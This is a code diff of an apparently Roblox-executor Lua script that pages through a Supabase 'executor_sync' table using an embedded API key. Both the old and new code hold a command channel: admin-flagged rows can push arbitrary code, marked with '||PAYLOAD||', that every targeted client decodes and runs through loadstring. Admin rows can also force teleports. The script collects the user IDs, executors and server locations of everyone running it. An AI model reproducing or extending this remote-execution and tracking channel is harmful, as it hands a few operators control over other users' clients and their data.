@@ -2962,94 +2962,128 @@ fetchUsers = function(force)
     isFetchingUsers = true
 
     task.spawn(function()
-        local resUser = nil
-        pcall(function()
-            resUser = request({
-                Url = SUPABASE_URL .. "/rest/v1/executor_sync?select=user_id,username,executor,teleport_target,active_effect,is_admin,is_sub_admin,current_game,job_id,place_id,updated_at&order=updated_at.desc&limit=2000",
-                Method = "GET",
-                Headers = { ["apikey"] = SUPABASE_KEY, ["Authorization"] = "Bearer " .. SUPABASE_KEY }
-            })
-        end)
+        local allUsers = {}
+        local pageSize = 1000
+        local offset = 0
+        local fetchSuccess = false
+
+        while running do
+            local resUser = nil
+            pcall(function()
+                resUser = request({
+                    Url = string.format(
+                        "%s/rest/v1/executor_sync?select=user_id,username,executor,teleport_target,active_effect,is_admin,is_sub_admin,current_game,job_id,place_id,updated_at&order=updated_at.desc&limit=%d&offset=%d",
+                        SUPABASE_URL,
+                        pageSize,
+                        offset
+                    ),
+                    Method = "GET",
+                    Headers = {
+                        ["apikey"] = SUPABASE_KEY,
+                        ["Authorization"] = "Bearer " .. SUPABASE_KEY
+                    }
+                })
+            end)
+
+            if resUser and resUser.StatusCode == 200 then
+                local success, batch = pcall(function()
+                    return HttpService:JSONDecode(resUser.Body)
+                end)
+                if success and type(batch) == "table" then
+                    fetchSuccess = true
+                    for _, u in ipairs(batch) do
+                        table.insert(allUsers, u)
+                    end
+                    if #batch < pageSize then
+                        break
+                    end
+                    offset = offset + pageSize
+                else
+                    break
+                end
+            else
+                break
+            end
+        end
+
         isFetchingUsers = false
 
         local adminPool = {}
-        if resUser and resUser.StatusCode == 200 then
-            local success, users = pcall(function() return HttpService:JSONDecode(resUser.Body) end)
-            if success and type(users) == "table" then
-                for _, u in ipairs(users) do
-                    if u.user_id then cachedUserIds[u.username] = u.user_id end
-                    if u.executor then cachedUserExecutors[u.username] = u.executor end
-                    if u.username and u.executor then trackUserExecutor(u.username, u.executor) end
-                    if u.is_admin == true or u.is_sub_admin == true then
-                        adminPool[u.username] = true
-                    end
-                    if u.user_id == UserId or u.username == Username then
-                        IsAdmin = (u.is_admin == true)
-                        IsSubAdmin = (u.is_sub_admin == true)
-                        local canAccessExec = (IsAdmin or IsSubAdmin) and (ADMIN_KEY ~= "")
-                        ChannelExecPanel.Visible = canAccessExec
-                        CatAdmin.Visible = canAccessExec
-                    end
+        if fetchSuccess then
+            local users = allUsers
+            for _, u in ipairs(users) do
+                if u.user_id then cachedUserIds[u.username] = u.user_id end
+                if u.executor then cachedUserExecutors[u.username] = u.executor end
+                if u.username and u.executor then trackUserExecutor(u.username, u.executor) end
+                if u.is_admin == true or u.is_sub_admin == true then
+                    adminPool[u.username] = true
                 end
-                cachedUserExecutors[Username] = myExecutor
-                cachedAdminPool = adminPool
-                cachedUsersData = users
-                if WindowFrame.Visible and currentTab == "users" then
-                    refreshUIList(users)
-                else
-                    pendingUsersRedraw = true
+                if u.user_id == UserId or u.username == Username then
+                    IsAdmin = (u.is_admin == true)
+                    IsSubAdmin = (u.is_sub_admin == true)
+                    local canAccessExec = (IsAdmin or IsSubAdmin) and (ADMIN_KEY ~= "")
+                    ChannelExecPanel.Visible = canAccessExec
+                    CatAdmin.Visible = canAccessExec
                 end
+            end
+            cachedUserExecutors[Username] = myExecutor
+            cachedAdminPool = adminPool
+            cachedUsersData = users
+            if WindowFrame.Visible and currentTab == "users" then
+                refreshUIList(users)
+            else
+                pendingUsersRedraw = true
+            end
 
-                for _, user in ipairs(users) do
-                    if user.teleport_target ~= "none" and (user.teleport_target == Username or user.teleport_target == "all") then
-                        if tick() - lastTeleportTime > 5 then
-                            if user.is_admin == true or user.is_sub_admin == true then
-                                lastTeleportTime = tick()
-                                TeleportService:TeleportToPlaceInstance(user.place_id, user.job_id, LocalPlayer)
-                            end
+            for _, user in ipairs(users) do
+                if user.teleport_target ~= "none" and (user.teleport_target == Username or user.teleport_target == "all") then
+                    if tick() - lastTeleportTime > 5 then
+                        if user.is_admin == true or user.is_sub_admin == true then
+                            lastTeleportTime = tick()
+                            TeleportService:TeleportToPlaceInstance(user.place_id, user.job_id, LocalPlayer)
                         end
                     end
+                end
 
-                    if user.active_effect and user.active_effect ~= "none" then
-                        local delimiterIndex = string.find(user.active_effect, "||PAYLOAD||")
-                        if delimiterIndex then
-                            local headerPart = string.sub(user.active_effect, 1, delimiterIndex - 1)
-                            local payloadPart = string.sub(user.active_effect, delimiterIndex + 11)
+                if user.active_effect and user.active_effect ~= "none" then
+                    local delimiterIndex = string.find(user.active_effect, "||PAYLOAD||")
+                    if delimiterIndex then
+                        local headerPart = string.sub(user.active_effect, 1, delimiterIndex - 1)
+                        local payloadPart = string.sub(user.active_effect, delimiterIndex + 11)
 
-                            local cmdData = string.split(headerPart, ":")
-                            local action = cmdData[1]
-                            local target = cmdData[2]
-                            local uniqueHash = cmdData[3]
+                        local cmdData = string.split(headerPart, ":")
+                        local action = cmdData[1]
+                        local target = cmdData[2]
+                        local uniqueHash = cmdData[3]
 
-                            if uniqueHash and not handledCommands[uniqueHash] then
-                                if user.is_admin == true or user.is_sub_admin == true then
-                                    handledCommands[uniqueHash] = true
-                                    if action == "runcode" and (target == Username or target == "all") then
-                                        local decodedCode = cleanUrlDecode(payloadPart)
-                                        local executable, execError = loadstring(decodedCode)
-                                        if executable then
-                                            task.spawn(executable)
-                                        else
-                                            warn("Execution String Error: " .. tostring(execError))
-                                        end
+                        if uniqueHash and not handledCommands[uniqueHash] then
+                            if user.is_admin == true or user.is_sub_admin == true then
+                                handledCommands[uniqueHash] = true
+                                if action == "runcode" and (target == Username or target == "all") then
+                                    local decodedCode = cleanUrlDecode(payloadPart)
+                                    local executable, execError = loadstring(decodedCode)
+                                    if executable then
+                                        task.spawn(executable)
+                                    else
+                                        warn("Execution String Error: " .. tostring(execError))
                                     end
                                 end
                             end
-                        else
-                            local cmdData = string.split(user.active_effect, ":")
-                            local action = cmdData[1]
-                            local target = cmdData[2]
-                            local uniqueHash = cmdData[3]
+                        end
+                    else
+                        local cmdData = string.split(user.active_effect, ":")
+                        local action = cmdData[1]
+                        local target = cmdData[2]
+                        local uniqueHash = cmdData[3]
 
-                            if uniqueHash and not handledCommands[uniqueHash] then
-                                if user.is_admin == true or user.is_sub_admin == true then
-                                    handledCommands[uniqueHash] = true
-                                    if action == "kill" or action == "explode" then
-                                        if target == Username or target == "all" then
-                                            runLocalExplosionEffect(Username)
-                                        else
-                                            runLocalExplosionEffect(target)
-                                        end
+                        if uniqueHash and not handledCommands[uniqueHash] then
+                            if user.is_admin == true or user.is_sub_admin == true then
+                                handledCommands[uniqueHash] = true
+                                if action == "kill" or action == "explode" then
+                                    if target == Username or target == "all" then
+                                        runLocalExplosionEffect(Username)
+                                    else
+                                        runLocalExplosionEffect(target)
                                     end
                                 end
                             end
